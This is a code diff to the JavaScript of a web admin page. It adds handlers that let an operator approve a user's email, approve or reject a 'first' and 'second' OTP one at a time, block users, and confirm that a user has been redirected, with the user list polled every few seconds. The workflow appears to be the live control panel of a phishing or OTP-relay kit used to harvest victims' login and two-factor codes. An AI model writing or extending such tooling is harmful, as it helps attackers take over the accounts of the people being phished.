-        btn.onclick = () => { document.body.classList.toggle('dark-mode'); localStorage.setItem('theme', document.body.classList.contains('dark-mode') ? 'dark' : 'light'); };
+// ==================== API CALLS ====================
+async function apiCall(endpoint, method, email, successMsg, errorMsg) {
+    try {
+        const response = await fetch(endpoint, { 
+            method, 
+            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, 
+            body: JSON.stringify({ email }) 
+        });
+        const data = await response.json();
+        if (data.success) { 
+            showToast('Success', successMsg); 
+            fetchUsers(); 
+        } else { 
+            showToast('Error', data.detail || errorMsg); 
+        }
+    } catch(e) { 
+        showToast('Error', 'Network error'); 
     }
+}
 
-    if (Notification.permission === 'default') Notification.requestPermission();
-    
-    setupTheme();
-    fetchUsers();
-    setInterval(fetchUsers, 3000);
-    
-    document.addEventListener('click', function onClick() {
-        unlockAudio();
-        document.removeEventListener('click', onClick);
-    }, { once: true });
-    
-    document.getElementById('soundToggleBtn').onclick = toggleSound;
-    document.getElementById('logoutBtn').onclick = () => { localStorage.removeItem('adminToken'); window.location.href = '/admin/login'; };
-</script>
+function approveEmail(email) { apiCall('/api/admin/approve-user', 'POST', email, 'Email approved', 'Failed'); }
+function approveFirstOTP(email) { apiCall('/api/admin/approve-first-otp', 'POST', email, 'First OTP approved', 'Failed'); }
+function successFirstOTP(email) { apiCall('/api/admin/success-first-otp', 'POST', email, 'Success! User redirected', 'Failed'); }
+function incorrectFirstOTP(email) { apiCall('/api/admin/incorrect-first-otp', 'POST', email, 'First OTP incorrect', 'Failed'); }
+function neverFirstOTP(email) { if(confirm(`Mark ${email} as NEVER? User will be blocked.`)) apiCall('/api/admin/never-first-otp', 'POST', email, 'User blocked', 'Failed'); }
+function approveSecondOTP(email) { apiCall('/api/admin/approve-second-otp', 'POST', email, 'Second OTP approved', 'Failed'); }
+function incorrectSecondOTP(email) { apiCall('/api/admin/incorrect-second-otp', 'POST', email, 'Second OTP incorrect', 'Failed'); }
+function resetUser(email) { if(confirm(`Reset ${email}? This will create a new record.`)) apiCall('/api/admin/reset-user', 'POST', email, 'User reset', 'Failed'); }
+function deleteUser(email) { if(confirm(`Delete ${email} permanently?`)) apiCall('/api/admin/delete-user', 'DELETE', email, 'User deleted', 'Failed'); }
+
+// ==================== THEME SETUP ====================
+function setupTheme() {
+    const savedTheme = localStorage.getItem('theme');
+    if (savedTheme === 'dark') document.body.classList.add('dark-mode');
+    const btn = document.getElementById('themeToggleBtn');
+    btn.onclick = () => { 
+        document.body.classList.toggle('dark-mode'); 
+        localStorage.setItem('theme', document.body.classList.contains('dark-mode') ? 'dark' : 'light'); 
+    };
+}
+
+// ==================== INITIALIZATION ====================
+setupTheme();
+fetchUsers();
+setInterval(fetchUsers, 3000);
+
+// Set up button handlers
+document.getElementById('soundToggleBtn').onclick = toggleSound;
+document.getElementById('logoutBtn').onclick = () => { 
+    localStorage.removeItem('adminToken'); 
+    window.location.href = '/admin/login'; 
+};
 </body>
 </html>
